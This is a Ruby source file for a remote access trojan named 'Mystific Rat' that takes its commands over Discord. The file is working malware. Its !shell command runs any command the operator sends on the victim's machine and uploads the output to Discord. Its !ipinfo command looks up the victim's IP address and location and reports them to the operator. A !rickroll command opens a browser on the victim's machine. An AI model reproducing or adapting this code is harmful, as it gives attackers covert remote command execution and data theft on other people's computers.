require 'discordrb'
require 'open3'
require 'rest-client'
require 'json'

bot = Discordrb::Bot.new token: 'Bot token here, also ik i could set prefix for the code but im lazy fuck so if you have problem make a pull request'

def bed(event, title, description, fields)
  embed = Discordrb::Webhooks::Embed.new
  embed.title = title
  embed.description = description
  embed.color = 0x800080

  fields.each do |name, value, inline|
    embed.add_field(name: name, value: "```\n#{value}```", inline: inline)
  end

  event.send '', false, embed
end

bot.message(content: '!help') do |event|
  help_message = <<~HELP
    Available Commands:
    - `!rickroll`: executes rickroll on users pc.
    - `!disconnect`: disconnects session.
    - `!help`: Display this help message.
    - `!ipinfo`: Get IP information.
    - `!shell <command>`: Execute shell commands ex. start cmd.exe.
  HELP
  bed(event, 'Mystific Rat - Help', help_message, [])
end

bot.message(content: '!rickroll') do |event|
  system('start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ')
  bed(event, 'Mystific Rat - Rickroll', "You've been rickrolled!", [])
end

bot.message(content: '!disconnect') do |event|
  bot.send_message(event.channel.id, "Goodbye!")
  bot.stop
end

bot.message(content: '!ipinfo') do |event|
  url = 'http://ipinfo.io/json'
  response = RestClient.get(url)
  data = JSON.parse(response)

  fields = {
    ':globe_with_meridians: IP' => data['ip'],
    ':house: City' => data['city'],
    ':map: Region' => data['region'],
    ':earth_americas: Country' => data['country'],
    ':briefcase: Organization' => data['org']
  }

  bed(event, 'Mystific Rat - IP INFO', 'IP Information', fields)
end

bot.message(content: /^!shell .*/) do |event|
  command = event.message.content.sub('!shell ', '')
  output, status = Open3.capture2e(command)

  if status.success?
    File.write('output.txt', output)
    event.send('', false, file: File.open('output.txt'))
    File.delete('output.txt')
  else
    event.respond("Failed to execute the command: #{command}")
  end
end


bot.run
